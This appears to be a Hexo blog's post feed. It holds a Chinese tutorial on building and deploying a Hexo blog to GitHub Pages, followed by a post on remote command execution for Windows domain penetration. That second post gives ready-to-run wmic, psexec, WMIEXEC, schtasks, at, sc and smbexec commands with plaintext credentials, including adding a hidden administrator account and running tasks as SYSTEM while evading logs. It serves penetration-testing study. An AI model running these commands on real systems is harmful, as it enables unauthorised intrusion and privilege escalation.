+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml <span class="comment"># 配置文件</span></span><br><span class="line">├── package.json <span class="comment"># 项目所需模块项目的配置信息</span></span><br><span class="line">├── scaffolds <span class="comment"># 用命令生成文章等的模板</span></span><br><span class="line">├── <span class="built_in">source</span> <span class="comment"># 源文件夹，这里放置网站内容</span></span><br><span class="line">|   ├── _drafts <span class="comment"># 放置草稿 markdown 文件</span></span><br><span class="line">|   └── _posts <span class="comment"># 放置博文 markdown 文件</span></span><br><span class="line">└── themes <span class="comment"># 主题文件夹，Hexo 通过将网站内容与主题相结合来生成一个静态网站</span></span><br></pre></td></tr></table></figure>
+
+<p>在 <code>_config.yml</code> 配置文件中填写你的网站的 <code>title</code>、<code>description</code>、<code>author</code> 。更多配置请参考 <a href="https://hexo.io/docs/configuration.html" target="_blank" rel="noopener">Hexo Configuration</a>。</p>
+<p>接着执行下列命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>
+
+<p>缩写：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line"><span class="comment"># 组合</span></span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>
+
+<p>到这里本地的博客已经有了初步的原型，先访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看下效果，后面继续。</p>
+<p>Hexo 的命令可以通过 <code>hexo help</code> 和 <code>hexo help [command]</code> 查看帮助，更多请参考 <a href="https://hexo.io/docs/commands.html" target="_blank" rel="noopener">Hexo Commands</a>。</p>
+<h2 id="hexo-主题"><a href="#hexo-主题" class="headerlink" title="hexo 主题"></a>hexo 主题</h2><p>hexo 的默认主题不太喜欢，可以在 <a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">Hexo Themes</a> 选一款自己喜欢的主题，我用过很多主题，<code>next</code>、<code>3-hexo</code>、<code>yilia</code>，最终我还是觉得 <a href="https://github.com/probberechts/cactus-dark" target="_blank" rel="noopener">Cactus Dark</a> 更简单、更友好。</p>
+<p>在 Github 下载主题文件，将文件整个目录 <code>cactus-dark</code> 复制到本地项目的 <code>themes</code> 目录下，然后修改配置文件 <code>_config.yml</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 站点根目录配置文件</span><br><span class="line">theme: cactus-dark</span><br></pre></td></tr></table></figure>
+
+<p>主题相关的配置在 <code>themes/cactus-dark/_config.yml</code> 里面，可以设置链接、添加菜单等，根据自己的需要配置。</p>
+<h2 id="hexo-插件"><a href="#hexo-插件" class="headerlink" title="hexo 插件"></a>hexo 插件</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p><a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="noopener">hexo-asset-image</a> 能帮助你更好地管理博客中所用到的图片，每篇博文都会生成一个单独的资源文件夹，而不是混在一起。安装命令是：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>
+
+<p>并且需要在根 <code>_config.yml</code> 里设置 <code>post_asset_folder: true</code>。</p>
+<p>安装完成后用 Hexo 新建文章时会在文章同目录下 <code>source/_posts</code> 生成一个和文章同名的文件夹，文章相关的所有图片放这个文件夹里就行，例如：</p>
+<p>在文章中插入图片时链接只要写图片名称就可以，比如要插入 <code>logo.jpg</code> ，只要写成 <code>![logo](logo.jpg)</code>。</p>
+<h3 id="RSS"><a href="#RSS" class="headerlink" title="RSS"></a>RSS</h3><p><a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 可生成 <code>atom.xml</code> 文件供订阅使用，安装命令是：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>_config.yml</code> 中配置以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">feed:</span><br><span class="line">  type: atom</span><br><span class="line">  path: atom.xml</span><br><span class="line">  limit: 20</span><br><span class="line">  hub:</span><br><span class="line">  content:</span><br></pre></td></tr></table></figure>
+
+<p>然后将 <code>/atom.xml</code> 链接添加到 <code>themes/cactus-dark/_config.yml</code> 中设置RSS的位置。</p>
+<h3 id="Sitemap"><a href="#Sitemap" class="headerlink" title="Sitemap"></a>Sitemap</h3><p>Sitemap 可方便搜索引擎抓取网页，安装 <a href="https://github.com/hexojs/hexo-generator-sitemap" target="_blank" rel="noopener">hexo-generator-sitemap</a> 即可自动生成 sitemap.xml 文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure>
+
+<p>站内搜索</p>
+<p>首先安装 <a href="https://www.npmjs.com/package/hexo-generator-search" target="_blank" rel="noopener">hexo-generate-search</a> 插件，它会生成一个搜索索引文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>
+
+<p>接下来，创建一个页面来显示搜索引擎：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new page search</span><br></pre></td></tr></table></figure>
+
+<p>并将 <code>search: true</code> 放入 <a href="https://hexo.io/zh-cn/docs/front-matter.html" target="_blank" rel="noopener">Front-matter</a> ，也就是 <code>.md</code> 文件最上方以 <code>---</code> 分隔的区域。</p>
+<p>最后编辑 <code>_config.yml</code> 并在导航菜单上添加一个搜索链接。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nav:</span><br><span class="line">  search: &#x2F;search&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>更多 Hexo 插件请参考 <a href="https://hexo.io/plugins/" target="_blank" rel="noopener">Hexo Plugins</a></p>
+<h2 id="发布到-GitHub"><a href="#发布到-GitHub" class="headerlink" title="发布到 GitHub"></a>发布到 GitHub</h2><p>至此本地的博客已经搭建起来了，下一步就是要发布到 Github。</p>
+<p>发布到 Github 前首先要配置 Git 用户信息和在 Github 上加入 SSH key ，如果之前在 Github 上提交过项目或者配置过这两项则可以忽略。</p>
+<h3 id="Git-用户信息"><a href="#Git-用户信息" class="headerlink" title="Git 用户信息"></a>Git 用户信息</h3><p>首先要配置的是你个人的用户名称和电子邮件地址。这两条配置很重要，每次 Git 提交时都会引用这两条信息，说明是谁提交了更新，所以会随更新内容一起被永久纳入历史记录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name mysecroad <span class="comment"># github名</span></span><br><span class="line">$ git config --global user.email l13273816330@163.com</span><br></pre></td></tr></table></figure>
+
+<p>如果用了 <code>--global</code> 选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。如果要在某个特定的项目中使用其他名字或者电邮，只要去掉 <code>--global</code> 选项重新配置即可，新的设定保存在当前项目的 <code>.git/config</code> 文件里。</p>
+<h3 id="在-Github-添加-SSH-key"><a href="#在-Github-添加-SSH-key" class="headerlink" title="在 Github 添加 SSH key"></a>在 Github 添加 SSH key</h3><p>使用 SSH key 可以连接到 GitHub ，而无需在每次访问时提供用户名或密码，方便 Git 提交代码到 Github 。所以必须提供 SSH key 用于授权。生成 SSH key 的命令是（Linux/Mac 在终端输入，Windows 在 Git Bash 输入）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa <span class="comment"># 指定 rsa 算法生成密钥</span></span><br></pre></td></tr></table></figure>
+
+<p>接着连续三个回车键（不需要输入密码），然后就会生成两个文件 <code>id_rsa</code> 和 <code>id_rsa.pub</code> ，id_rsa 是密钥，id_rsa.pub 是公钥。这两个文件在 Linux/Mac 系统是在 <code>~/.ssh</code> 下，Windows 系统在 <code>C:/Users/username/.ssh</code> 下。</p>
+<p>接下来要把 id_rsa.pub 的内容添加到 GitHub 上，这样你本地的 id_rsa 密钥跟 Github 上的 id_rsa.pub 公钥进行配对，授权成功才可以提交代码。</p>
+<p>打开 Github 的 Setting 页面，点击左侧的 SSH and GPG keys：</p>
+<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cssh_key.png" alt></p>
+<p>然后点击页面右上角的 New SSH key 按钮：</p>
+<p><img src="/posts/28047/new_ssh.png" alt></p>
+<p>在 Key 那栏把 <code>id_rsa.pub</code> 文件里的内容复制粘贴进去就可以了，<code>Title</code> 不需要填写，点击 Add SSH key 按钮就 ok 了。</p>
+<p>SSH key 添加成功后，输入 <code>ssh -T git@github.com</code> 进行测试，如果出现以下提示就证明添加成功了。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi mysecroad! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages"></a>Github Pages</h3><p>在 Github 上<a href="https://github.com/new" target="_blank" rel="noopener">新建</a>一个名为 <code>username</code>.github.io 的 repository ， username 是你的 Github 账号，比如我的叫 mysecroad.github.io 。然后修改配置文件 <code>_config.yml</code> 里的以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># url 就是刚才新建的 repository 的名称</span><br><span class="line"># repo 是刚才新建的 repository 的 SSH url</span><br><span class="line">url: https:&#x2F;&#x2F;mysecroad.github.io</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:mysecroad&#x2F;mysecroad.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+
+<p>经过前面的更改主题、安装插件等一系列配置之后，静态文件需要重新生成：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo clean # 清除 public 文件夹中的静态文件</span><br><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>
+
+<p>访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看效果，确认页面无误后执行下列命令将静态文件发布到 Github:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy ==&gt; hexo d</span><br></pre></td></tr></table></figure>
+
+<p>到这里博客就完全搭建起来了，访问 <a href="https://mysecroad.github.io/">https://mysecroad.github.io</a> 就可以看到博客了。</p>
+<h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><p>正式发表博客前可以先打个草稿：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new draft <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hello-world 的草稿</span></span><br></pre></td></tr></table></figure>
+
+<p>执行此命令后，会在 <code>source/_drafts</code> 目录下生成一个 <code>hello-world.md</code> 文件，然后用文本编辑器打开 <code>hello-world.md</code> 就可以编辑博文了，使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写。</p>
+<p>新建草稿时标题建议使用英文单词之间加横杠的这种形式，例如 “hello-world” ，而不要使用中文，因为默认会使用文件名作为文章的 url，真正的标题可以在 <code>hello-world.md</code> 文件里面设置。</p>
+<p>默认情况下，草稿不显示。可以在运行 Hexo 时添加 <code>--draft</code> 选项：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server --draft <span class="comment"># 启动服务并预览草稿</span></span><br><span class="line">$ hexo publish <span class="string">"hello-world"</span> <span class="comment"># 发布草稿，会把草稿移到 source/_posts 目录下</span></span><br><span class="line">$ hexo deploy --generate <span class="comment"># 生成静态文件并发布到 Github</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以不打草稿：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new post <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hellow-world 的博文</span></span><br></pre></td></tr></table></figure>
+
+<p>这个命令会在 <code>source/_posts</code> 目录下生成一个 <code>hello-world.md</code> 文件，同样使用文本编辑器编辑这个文件。博文写完预览后直接发布到 Github：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>
+
+<p>更多请参考 <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Hexo Writing</a>。</p>
+<h2 id="源文件管理"><a href="#源文件管理" class="headerlink" title="源文件管理"></a>源文件管理</h2><p>如果要用另一台电脑写博客怎么办呢，这里介绍一种方法就是使用 Git 分支，创建两个分支，一个分支用来放博客的原始文件，另一个分支用来放生成的静态文件。</p>
+<h3 id="提交源文件到分支"><a href="#提交源文件到分支" class="headerlink" title="提交源文件到分支"></a>提交源文件到分支</h3><p>先删除 <code>themes</code> 文件夹下的 <code>.git</code> 文件。然后在 <code>_config.yml</code> 中的 <code>deploy</code> 参数下设置 <code>branch: master</code> ，如果前面已经设置过就不用改了，这一步是为了确认将静态文件提交到 <code>master</code> 分支：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lihthub&#x2F;lihthub.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+
+<p>接着在本地博客文件夹下依次执行下列命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git init <span class="comment"># 初始化 Git 项目</span></span><br><span class="line">$ git checkout -b develop <span class="comment"># 新建并切换到 develop 分支</span></span><br><span class="line"><span class="comment"># 添加远程仓库 origin ，后面是你在 Github 上创建的 repository 的 url</span></span><br><span class="line">$ git remote add origin git@github.com:lihthub/lihthub.github.io.git</span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有文件加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是本地博客文件夹根目录下的 <code>.gitignore</code> 是 Hexo 自带的文件，也要提交到仓库，里面列的是要被 Git 忽略的文件，这些文件不需要纳入 Git 的管理。</p>
+<p>这样就把本地博客项目提交到你的 Github 中 <code>mysecroad.github.io</code> 仓库的 <code>develop</code> 分支上了。然后将仓库的默认分支设置为 <code>develop</code>，因为 <code>develop</code> 分支需要手动管理。</p>
+<p>在 Github 中打开 <code>mysecorad.github.io</code> 仓库的主页面，点击上面的 2 branches:</p>
+<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cgithub.io.png" alt></p>
+<p>然后点击页面右上角的 Change default branch 按钮:</p>
+<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cchange_brance.png" alt></p>
+<p>然后按下图所示依次点击将 Default branch 设为 <code>develop</code>:</p>
+<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cdefult.png" alt></p>
+<p>每次更新完博客或者更改了源文件都要执行下列命令提交更新：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status <span class="comment"># 检查文件状态</span></span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有更新加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="换台电脑写博客"><a href="#换台电脑写博客" class="headerlink" title="换台电脑写博客"></a>换台电脑写博客</h3><p>首先需要在新电脑上将远程仓库克隆下来：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@github.com:mysecroad/mysecroad.github.io.git</span><br></pre></td></tr></table></figure>
+
+<p>输入 <code>git branch</code> 确认一下当前分支是否为 develop 。然后安装 Node.js 和 Git 。接着执行以下命令安装 Hexo：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
+
+<p>装好 Hexo 后，进入 <code>mysecroad.github.io</code> 目录，安装所需要的 Hexo 插件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> mysecroad.github.io</span><br><span class="line">$ npm install</span><br><span class="line">$ npm install hexo-asset-image --save <span class="comment"># 图片管理</span></span><br><span class="line">$ npm install hexo-generator-feed --save <span class="comment"># RSS订阅</span></span><br><span class="line">$ npm install hexo-generator-sitemap --save <span class="comment"># 生成 sitemap.xml</span></span><br><span class="line">$ npm install hexo-deployer-git --save <span class="comment"># Git部署</span></span><br><span class="line">$ npm install hexo-generator-search --save <span class="comment"># 站内搜索</span></span><br></pre></td></tr></table></figure>
+
+<p>按前面的步骤配置好 Git 用户信息和在 Github 上加入 SSH key 后新电脑的环境就搭建好了，就可以写博客了。</p>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>域渗透远程执行命令的几种姿势</title>
+    <url>/posts/35747.html</url>
+    <content><![CDATA[<h1 id="域渗透远程执行命令的几种姿势"><a href="#域渗透远程执行命令的几种姿势" class="headerlink" title="域渗透远程执行命令的几种姿势"></a>域渗透远程执行命令的几种姿势</h1><h2 id="0x00-vmic"><a href="#0x00-vmic" class="headerlink" title="0x00 vmic"></a>0x00 vmic</h2><p>WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统，攻击者使用 wmi 来进行攻击，但 Windows 系统默认不会在日志中记录这些操作，可以做到<strong>无日志</strong>，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用 wmic 进行远程执行命令。</p>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol>
+<li><p>在远程系统上执行 bat 脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.72.10 &#x2F;user:administrator &#x2F;password:L111111! process call create c:\test.bat</span><br></pre></td></tr></table></figure></li>
+<li><p>在远程系统上执行单条命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.72.10 &#x2F;user:administrator &#x2F;password:L111111 process call create &quot;cmd.exe &#x2F;c net user test1 !@#123QWE &#x2F;add &amp;&amp; net localgroup administrators test1 &#x2F;add</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h3 id="工具说明"><a href="#工具说明" class="headerlink" title="工具说明"></a>工具说明</h3><ol>
+<li>需要远程系统启动 Windows Management Instrumentation 服务，开放135端口</li>
+<li>远程系统的本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”</li>
+<li>wmic 会以管理员权限在远程系统上执行命令</li>
+<li>防火墙开启将无法连接</li>
+<li>如果报错 “Invalid Global Switch” ，用双引号把包含-的结点括起来即可正常执行。</li>
+</ol>
+<h2 id="0x01-psexec"><a href="#0x01-psexec" class="headerlink" title="0x01 psexec"></a>0x01 psexec</h2><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>psexec针对远程建立连接的认证方式有两种，一种先建立 ipc 连接，然后直接用 <code>psexec \\192.168.72.10 cmd</code> 命令开启一个半交互式的cmdshell，另一种是在psexec的参数中指定账号密码。</p>
+<p><img src="/posts/35747/11.png" alt></p>
+<p><img src="/posts/35747/12.png" alt></p>
+<h3 id="执行原理"><a href="#执行原理" class="headerlink" title="执行原理"></a>执行原理</h3><ol>
+<li>通过ipc连接，释放psexesvc.exe到目标</li>
+<li>通过服务管理SCManager远程创建psexecsvc服务，并启动服务</li>
+<li>客户端连接执行命令,服务端启动相应的程序并执行回显数据</li>
+</ol>
+<h3 id="工具说明-1"><a href="#工具说明-1" class="headerlink" title="工具说明"></a>工具说明</h3><p><strong>注意：</strong></p>
+<ol>
+<li>目标主机第一次运行时，会出现弹框提示。<br>解决办法：先执行 <code>psexec /accepteula</code> 即可避免。</li>
+<li>运行完之后记得删除服务。这个在日志中会有记录，而且在少数情况下会出现服务删除不成功！！！<br>所以一般不用它。</li>
+<li>需要远程系统开启 ADMIN$ 共享</li>
+<li>建立 ipc 连接后可以不指定用户名和密码</li>
+</ol>
+<h2 id="0x02-WMIEXEC"><a href="#0x02-WMIEXEC" class="headerlink" title="0x02 WMIEXEC"></a>0x02 WMIEXEC</h2><p>WMI 可以远程执行命令，大牛使用VBS脚本调用WMI来模拟 psexec 的功能，于是乎WMIEXEC 就诞生了。基本上psexec 能用的地方，这个脚本也能够使用。整个过程是先调用WMI通过账号密码或者NTLM认证（WCE注入）连接到远程计算机，然后如果提供了账号密码，则用这个账号密码建立一个到目标的IPC连接。随后WMI会建立一个共享文件夹，用于远程读取命令执行结果。 当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹中。最后，通过FSO组件访问远程共享文件夹中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享。<br><img src="/posts/35747/21.png" alt><br>WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。</p>
+<p>WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</p>
+<p><strong>半交互式shell模式</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell IP username password</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/35747/22.png" alt></p>
+<p><strong>单个命令执行的模式</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs &#x2F;cmd IP username password &quot;command&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/35747/23.png" alt></p>
+<h2 id="0x03-at-amp-schtasks计划任务"><a href="#0x03-at-amp-schtasks计划任务" class="headerlink" title="0x03 at&amp;schtasks计划任务"></a>0x03 at&amp;schtasks计划任务</h2><h3 id="net-use-at"><a href="#net-use-at" class="headerlink" title="net use + at"></a>net use + at</h3><p>建立ipc连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\目标IP\ipc$ password &#x2F;user:username</span><br></pre></td></tr></table></figure>
+<p>拷贝文件到远程系统</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy 文件 \\目标IP\c$</span><br></pre></td></tr></table></figure>
+<p>查看远程主机当前时间</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\目标IP</span><br></pre></td></tr></table></figure>
+<p>添加计划任务在远程系统上执行命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\目标IP 时间 cmd.exe &#x2F;c &quot;ipconfig &#x2F;all &gt;c:ip.log&quot;</span><br></pre></td></tr></table></figure>
+<p>添加计划任务在远程系统上执行bat脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\目标IP 时间 c:test.bat</span><br></pre></td></tr></table></figure>
+<p>查看at任务列表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\目标IP</span><br></pre></td></tr></table></figure>
+<p>删除at计划任务，运行完成后一定要删除计划任务！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\目标IP 1 &#x2F;delete</span><br></pre></td></tr></table></figure>
+<p>查看所有ipc连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure>
+<p>删除指定ipc连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\目标IP\ipc$ &#x2F;del</span><br></pre></td></tr></table></figure>
+<p>删除所有ipc连接（删除前记得确认是否都是自己测试中建立的连接）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use * &#x2F;del &#x2F;y</span><br></pre></td></tr></table></figure>
+
+<h3 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h3><h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><p>在远程系统建立计划任务(计划运行时会以 system 权限在远程系统上执行单条命令)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn test &#x2F;sc onstart &#x2F;tr &quot;cmd.exe &#x2F;c netstat -ano | findstr 3389 &gt;&gt; c:\programdata\error.log&quot; &#x2F;ru system &#x2F;f</span><br></pre></td></tr></table></figure>
+<p>在远程系统建立计划任务(计划运行时会以 system 权限在远程系统上执行 bat 脚本)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn test &#x2F;sc onstart &#x2F;tr c:\programdata\test.bat &#x2F;ru system &#x2F;f</span><br></pre></td></tr></table></figure>
+<p>在远程系统建立计划任务(计划运行时会以管理员权限在远程系统上执行单条命令),注：这条命令不支持 hash 注入后省去用户名密码执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn test &#x2F;sc onstart &#x2F;tr &quot;cmd.exe &#x2F;c whoami &#x2F;all &gt;&gt; c:\programdata\error.log&quot; &#x2F;ru  workgroup\administrator&quot;</span><br></pre></td></tr></table></figure>
+<p>查看建立的计划任务是否正确</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; | findstr test</span><br></pre></td></tr></table></figure>
+<p>运行建立的计划任务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;run &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;i &#x2F;tn &quot;test&quot;</span><br></pre></td></tr></table></figure>
+<p>删除建立的计划任务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;delete &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn &quot;test&quot; &#x2F;f</span><br></pre></td></tr></table></figure>
+<p>注意：<br>工具需要远程系统启动 Task Scheduler 服务，schtasks 不需要 RPC 服务的支持，在条件允许的情况下，尽量使用 schtasks，因为在某些条件下，at 执行完任务后，任务信息没有删除（需要手动删除），用at命令查不到任务信息，但是用 schtasks 却能看到任务信息，任务名是At加一个数字。</p>
+<h2 id="0x04-SC添加服务远程执行命令"><a href="#0x04-SC添加服务远程执行命令" class="headerlink" title="0x04 SC添加服务远程执行命令"></a>0x04 SC添加服务远程执行命令</h2><h3 id="常用命令-2"><a href="#常用命令-2" class="headerlink" title="常用命令"></a>常用命令</h3><p>建立 ipc 连接后，上传等待运行的 bat 脚本到目标系统上，创建服务（开启服务时会以system 权限在远程系统上执行 bat 脚本）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.168.17.138 create test binpath&#x3D; &quot;cmd.exe &#x2F;c start c:\programdata\test.bat&quot;</span><br></pre></td></tr></table></figure>
+<p>开启服务，运行其它命令可以直接修改 bat 脚本内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.168.17.138 start test</span><br></pre></td></tr></table></figure>
+<p>删除服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.168.17.138 delete test</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-smbexec"><a href="#0x05-smbexec" class="headerlink" title="0x05 smbexec"></a>0x05 smbexec</h2><p>smbexec 是基于 psexec 修改的程序，加入了参数来指定默认共享，可以在目标为开启 admin$ 共享但开了其它共享时使用。</p>
+<h3 id="常用命令-3"><a href="#常用命令-3" class="headerlink" title="常用命令"></a>常用命令</h3><p>建立 ipc 连接后，上传 execserver.exe 到远程系统上</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy execserver.exe \\192.168.17.138\c$\windows</span><br></pre></td></tr></table></figure>
+<p>在远程系统上执行单条命令(以管理员权限执行命令)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.exe 192.168.17.138 Administrator !@#123QWE &quot;whoami &#x2F;all&quot; c$</span><br></pre></td></tr></table></figure>
+<p>在远程系统上执行单条命令</p>
